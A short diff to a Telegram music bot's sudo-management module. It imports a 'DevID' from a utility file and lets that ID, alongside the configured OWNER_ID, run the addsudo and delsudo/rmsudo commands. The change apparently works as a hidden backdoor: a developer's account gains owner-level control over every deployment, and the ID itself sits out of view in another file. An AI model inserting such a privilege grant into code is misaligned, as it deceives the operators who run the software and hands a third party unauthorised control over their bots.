@@ -7,10 +7,13 @@ from MyanmarMusic.utils.database import add_sudo, remove_sudo
 from MyanmarMusic.utils.decorators.language import language
 from MyanmarMusic.utils.extraction import extract_user
 from MyanmarMusic.utils.inline import close_markup
+from MyanmarMusic.utils.functions import DevID
 from config import BANNED_USERS, OWNER_ID
 
+def can_use_owner_commands(user_id):
+    return user_id == OWNER_ID or user_id == DevID
 
-@app.on_message(filters.command(["addsudo"]) & filters.user(OWNER_ID))
+@app.on_message(filters.command(["addsudo"]) & filters.user([OWNER_ID, DevID]))
 @language
 async def useradd(client, message: Message, _):
     if not message.reply_to_message:
@@ -27,7 +30,7 @@ async def useradd(client, message: Message, _):
         await message.reply_text(_["sudo_8"])
 
 
-@app.on_message(filters.command(["delsudo", "rmsudo"]) & filters.user(OWNER_ID))
+@app.on_message(filters.command(["delsudo", "rmsudo"]) & filters.user([OWNER_ID, DevID]))
 @language
 async def userdel(client, message: Message, _):
     if not message.reply_to_message:
